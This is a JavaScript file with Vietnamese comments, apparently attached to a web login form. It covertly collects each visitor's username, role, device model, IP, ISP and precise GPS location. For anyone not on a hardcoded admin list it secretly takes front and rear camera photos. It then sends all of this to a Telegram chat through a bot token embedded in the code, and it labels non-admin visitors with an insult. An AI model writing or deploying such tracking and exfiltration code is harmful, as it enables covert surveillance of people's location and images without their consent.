const TELEGRAM_BOT_TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
const TELEGRAM_CHAT_ID = '-1003770043455';

const API_SEND_TEXT = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
const API_SEND_MEDIA = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;

const info = {
  time: '', 
  ip: '',
  isp: '',
  address: '',
  lat: '',
  lon: '',
  loginDetails: '',
  isAdmin: false,
  device: ''
};

// --- 1. LẤY THIẾT BỊ (DVI) CHUẨN ---
function getDeviceInfo() {
    const ua = navigator.userAgent;
    const ratio = window.devicePixelRatio;
    const screenRes = `${window.screen.width * ratio}x${window.screen.height * ratio}`;
    let model = "";

    if (/iPhone|iPad/.test(ua)) {
        model = "Apple Device";
        if (screenRes === "1290x2796") model = "iPhone 15/16 Pro Max";
        else if (screenRes === "1179x2556") model = "iPhone 15/16 Pro";
        else if (screenRes === "1284x2778") model = "iPhone 12/13/14 Pro Max";
        else if (screenRes === "1170x2532") model = "iPhone 12/13/14 / Pro";
    } else if (/Android/.test(ua)) {
        const match = ua.match(/Android\s([0-9\.]+);.*?\s([^;]+)\sBuild/);
        model = match ? `Android ${match[1]} - ${match[2]}` : "Android Phone";
    } else if (/Windows/.test(ua)) {
        model = "Windows PC";
    } else {
        model = "Thiết bị không xác định";
    }
    
    let browser = ua.includes("Chrome") ? "Chrome" : ua.includes("Safari") ? "Safari" : "Browser";
    return `${model} (${browser})`;
}

// --- 2. LẤY VỊ TRÍ CHUẨN (ƯU TIÊN GPS) ---
async function getLocationData() {
    return new Promise((resolve) => {
        // Cố gắng lấy GPS chính xác cao
        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(
                async (pos) => {
                    info.lat = pos.coords.latitude.toFixed(6);
                    info.lon = pos.coords.longitude.toFixed(6);
                    info.address = "📍 Vị trí chính xác (GPS)";
                    await getIPInfo(); // Vẫn lấy IP để biết nhà mạng
                    resolve();
                },
                async () => {
                    // Nếu bị từ chối GPS, dùng IP làm dự phòng
                    await getIPInfo();
                    resolve();
                },
                { enableHighAccuracy: true, timeout: 5000 }
            );
        } else {
            getIPInfo().then(resolve);
        }
    });
}

async function getIPInfo() {
    try {
        const res = await fetch(`https://ipwho.is/`);
        const data = await res.json();
        info.ip = data.ip || 'Không rõ';
        info.isp = data.connection?.org || 'ISP';
        if (!info.lat) { // Nếu GPS chưa có mới dùng tọa độ IP
            info.lat = data.latitude || 0;
            info.lon = data.longitude || 0;
            info.address = `${data.city}, ${data.region} (Tọa độ IP)`;
        }
    } catch (e) { 
        info.ip = 'Lỗi kết nối'; 
    }
}

// --- 3. CHỤP CAM ---
async function captureCamera(mode = 'user') {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: false });
        return new Promise(resolve => {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            video.onloadedmetadata = () => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                setTimeout(() => {
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    stream.getTracks().forEach(t => t.stop());
                    canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
                }, 800);
            };
        });
    } catch (e) { return null; }
}

// --- 4. TẠO NỘI DUNG ---
function getCaption() {
    // Link ghim vị trí chuẩn trên Google Maps
    const mapsLink = `https://www.google.com/maps?q=${info.lat},${info.lon}`;
    
    let header = "";
    let dviLine = "";

    if (info.isAdmin) {
        header = `⚠️ THÔNG BÁO ADMIN ${info.loginDetails.toUpperCase()} VỪA ĐĂNG NHẬP`;
        dviLine = ""; // Admin ẩn dvi
    } else {
        header = `🚫 PHÁT HIỆN MỘT CON CHÓ NGU`;
        dviLine = `📱 Thiết bị (dvi): ${info.device}\n`; 
    }

    return `
${header}
━━━━━━━━━━━━━━━━━━
⏰ Thời gian: ${info.time}
👤 Tài khoản: ${info.loginDetails}
🌐 IP dân cư: ${info.ip}
🏢 Nhà mạng: ${info.isp}
${dviLine}🏙️ Địa chỉ: ${info.address}
📍 Bản đồ: ${mapsLink}
━━━━━━━━━━━━━━━━━━
`.trim();
}

// --- 5. HÀM CHÍNH ---
async function main() {
    const user = document.getElementById('username').value.trim();
    const role = document.getElementById('user-role').value;
    
    info.time = new Date().toLocaleString('vi-VN');
    info.loginDetails = `${user} (${role})`;
    info.isAdmin = (user === "Mrwenben" || user === "VanThanh");
    info.device = getDeviceInfo();

    // Chờ lấy vị trí chuẩn
    await getLocationData();
    
    if (info.isAdmin) {
        await fetch(API_SEND_TEXT, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: getCaption(), disable_web_page_preview: true })
        });
        return true;
    }

    // Chụp 2 cam cho người lạ
    const frontBlob = await captureCamera('user');
    const backBlob = await captureCamera('environment');

    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    
    const media = [];
    if (frontBlob) {
        formData.append('front', frontBlob, 'front.jpg');
        media.push({ type: 'photo', media: 'attach://front', caption: getCaption() });
    }
    if (backBlob) {
        formData.append('back', backBlob, 'back.jpg');
        media.push({ type: 'photo', media: 'attach://back' });
    }

    if (media.length > 0) {
        formData.append('media', JSON.stringify(media));
        await fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
    } else {
        await fetch(API_SEND_TEXT, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: getCaption() })
        });
    }
    return true; 
}
